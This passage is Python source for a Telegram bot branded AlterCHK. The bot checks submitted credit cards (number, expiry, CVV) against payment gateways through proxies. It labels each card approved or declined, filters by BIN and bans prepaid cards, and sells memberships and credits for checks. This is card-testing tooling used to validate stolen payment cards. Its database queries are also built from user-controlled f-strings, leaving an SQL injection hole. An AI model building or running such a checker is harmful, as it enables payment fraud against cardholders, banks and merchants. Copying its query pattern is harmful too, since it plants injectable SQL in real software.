        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDti import CMDti
        CheckRecive_start = await CMDti(CcVerify, CheckedP[1])
        if (CheckRecive_start[0] == 'Approved') :
            CheckRecive = CheckRecive_start[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive_start[1].find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive_start[1]} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
            CheckRecive = CheckRecive_start[1]
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            total_count = "1" if len(CheckRecive_start) > 0 and CheckRecive_start[0] in ["Approved"] else 0
            result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            Credits = result['Creditos']
            new_credits = int(Credits) - int(total_count)
            await ConnectDB.run_query(f"UPDATE pruebas SET Creditos='{new_credits}' WHERE ID='{message.from_user.id}'")
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["od"])
async def CMDpez(message: types.Message):
    NameGateway = 'Gateway 🔥 Olimpo [ CCN Auth ]'
    TwoNameGateway = 'Gateway ↯ Olimpo [ CCN Auth ]'
    ThreeGateway = 'Gateway 🔥 Olimpo [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('od')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDod import AuthorizeCCN
        CheckRecive = await AuthorizeCCN(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["saf"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Safire [ 8$ ]'
    TwoNameGateway = 'Gateway ↯ Safire [ 8$ ]'
    ThreeGateway = 'Gateway 🔥 Safire [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('saf')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This Gateway only accepts Visa and Mastercard.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
